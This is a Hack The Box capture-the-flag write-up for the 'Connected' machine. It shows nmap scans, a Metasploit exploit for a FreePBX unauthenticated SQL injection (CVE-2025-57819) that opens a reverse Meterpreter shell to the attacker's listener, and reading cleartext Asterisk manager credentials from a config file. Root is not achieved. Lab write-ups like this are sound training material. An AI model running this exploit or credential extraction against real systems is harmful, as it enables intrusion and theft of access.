# Connected - Hack The Box Writeup

## Introduction
**Connected** is an easy-difficulty Linux machine on Hack The Box. The machine simulates an enterprise VoIP telephony server running **FreePBX 16.0.40.7**. Initial access is achieved by identifying the exposed PBX management portal and exploiting an unauthenticated SQL Injection vulnerability in the Endpoint Manager component that leads to Remote Code Execution (CVE-2025-57819). Exploiting this vulnerability via Metasploit provides an interactive Meterpreter shell as the `asterisk` service user. Internal post-exploitation enumeration reveals a local Asterisk Manager Interface (AMI) service listening on `127.0.0.1:5038` and extracts cleartext administrative credentials from `/etc/asterisk/manager.conf`.

> [!NOTE]
> **Assessment Retrospective & Learning Note:**
> The root flag was not captured during this assessment. While initial access as `asterisk` and internal service enumeration were successfully achieved, progressing through privilege escalation to `root` proved elusive and exceeded my technical knowledge at the time. Rather than omitting this machine, this writeup is documented with full sincerity and humility. Documenting the roadblock provides an authentic record of the methodology used, highlights areas where further study is required, and serves as a stepping stone for continuous improvement in cybersecurity.

### Attack Summary Table
| Metric / Phase | Details |
| --- | --- |
| **Target IP** | `10.129.245.100` |
| **OS** | Linux |
| **Initial Access** | FreePBX 16.0.40.7 Unauthenticated SQLi to RCE (CVE-2025-57819) -> Shell as `asterisk` |
| **Internal Enumeration** | Asterisk Manager Interface (AMI) on `127.0.0.1:5038` & Credential Leak (`/etc/asterisk/manager.conf`) |
| **Privilege Escalation** | Incomplete / Not Achieved (Documented with transparency) |

---

## Reconnaissance

### Port Scanning
An initial TCP port scan was executed across all ports to discover active services and open ports on the target host:

```bash
nmap 10.129.245.100 -n -Pn -p- -vvv -oN fastscan
```

```text
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack
80/tcp  open  http    syn-ack
443/tcp open  https   syn-ack
```

A targeted service enumeration scan was then launched on the web service (port 80):

```bash
nmap 10.129.245.100 -n -Pn -p 80 -A -vvv -oN httpscan
```

The scan detected an HTTP redirection to `http://connected.htb/`:

```text
http-title: Did not follow redirect to http://connected.htb/
```

To allow proper hostname resolution, `connected.htb` was added to the `/etc/hosts` file:

```bash
echo "10.129.245.100 connected.htb" | sudo tee -a /etc/hosts
```

---

## Initial Access

### Web Enumeration & FreePBX Discovery
Navigating to `http://connected.htb` revealed a web interface hosting an instance of **FreePBX**. The application banner explicitly exposed the version in use:

```text
FreePBX 16.0.40.7 is licensed under the GPL
Copyright© 2007-2026
```

### Remote Code Execution via SQL Injection (CVE-2025-57819)
Researching known vulnerabilities for FreePBX version 16.0.40.7 revealed **CVE-2025-57819**, an unauthenticated SQL Injection flaw within the Endpoint Manager `ajax.php` component that can be escalated to arbitrary Remote Code Execution (RCE). 

A dedicated Metasploit module is available for this vector:

```bash
msfconsole -q
msf6 > search freepbx
```

```text
Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   3  exploit/unix/http/freepbx_unauth_sqli_to_rce   2025-08-28       excellent  Yes    FreePBX ajax.php unauthenticated SQLi to RCE
```

The exploit was configured with the target IP, domain name, and local listener parameters:

```bash
msf6 > use exploit/unix/http/freepbx_unauth_sqli_to_rce
msf6 exploit(unix/http/freepbx_unauth_sqli_to_rce) > set RHOSTS 10.129.245.100
msf6 exploit(unix/http/freepbx_unauth_sqli_to_rce) > set LHOST 10.10.15.105
msf6 exploit(unix/http/freepbx_unauth_sqli_to_rce) > set VHOST connected.htb
msf6 exploit(unix/http/freepbx_unauth_sqli_to_rce) > run
```

```text
[*] Started reverse TCP handler on 10.10.15.105:4444 
[+] Created cronjob with job name: 'mZDrxE'
[*] Waiting for cronjob to trigger...
[*] Sending stage (3090404 bytes) to 10.129.245.100
[*] Meterpreter session 1 opened (10.10.15.105:4444 -> 10.129.245.100:33006) at 2026-08-22 18:00:16 +0200
[*] Attempting to perform cleanup
[+] Cronjob removed, happy hacking!

(Meterpreter 1)(/home/asterisk) > 
```

The exploit successfully scheduled a payload and returned an active Meterpreter session operating under the context of the `asterisk` user.

---

## Post-Exploitation & Internal Enumeration

### Internal Network Service Discovery
After establishing a system shell from the Meterpreter session, internal listening ports were enumerated:

```bash
ss -tuln
```

```text
tcp    LISTEN     0      10                       127.0.0.1:5038                                         *:*
```

Port `5038` is the default port for the **Asterisk Manager Interface (AMI)**, a service allowing administrative management and call routing via socket connections.

### Asterisk Configuration & Credential Extraction
Inspecting the configuration files under `/etc/asterisk/` revealed authentication credentials for the Asterisk Manager Interface inside `/etc/asterisk/manager.conf`:

```bash
cat /etc/asterisk/manager.conf
```

```text
[general]
enabled = yes
port = 5038
bindaddr = 127.0.0.1
displayconnects=no ;only effects 1.6+

[wnPa2WbXJ/ED]
secret = fe1mYBs7D5P3
```

* **Discovered AMI Account:** `wnPa2WbXJ/ED`
* **Password/Secret:** `fe1mYBs7D5P3`

---

## Privilege Escalation (Roadblock & Retrospective)

### Escalation Attempt
With the discovered AMI credentials and active access as the `asterisk` service account, enumeration focused on identifying vectors to elevate privileges to `root`. Standard Linux privilege escalation checks were conducted:
* Investigated `sudo -l` permissions and system sudo rules.
* Checked running processes (`ps aux`) for background services running as root.
* Evaluated SUID/SGID binaries and custom scripts.
* Explored interacting with the Asterisk daemon and AMI console to execute system-level commands.

### Roadblock & Lessons Learned
Despite identifying the AMI service credentials and reviewing Asterisk configuration files, translating this access into an effective root compromise was unsuccessful during this session. Privilege escalation vectors involving specialized PBX software, backend daemons (such as file-monitoring daemons or kernel/service interactions), often require nuanced domain-specific knowledge that was beyond my capabilities at that stage.

Rather than hiding this outcome, documenting this stopping point reinforces an honest security mindset:
1. **Understanding Limitations:** Recognizing when a technical obstacle requires more study rather than guesswork.
2. **Key Learning Vector:** The need to dive deeper into Asterisk Manager Interface (AMI) command capabilities, action abuse (`Originate`, `System`), and file-trigger services.
3. **Future Retesting:** Returning to this target after reviewing VoIP/Asterisk security architecture to fully complete the path to root.
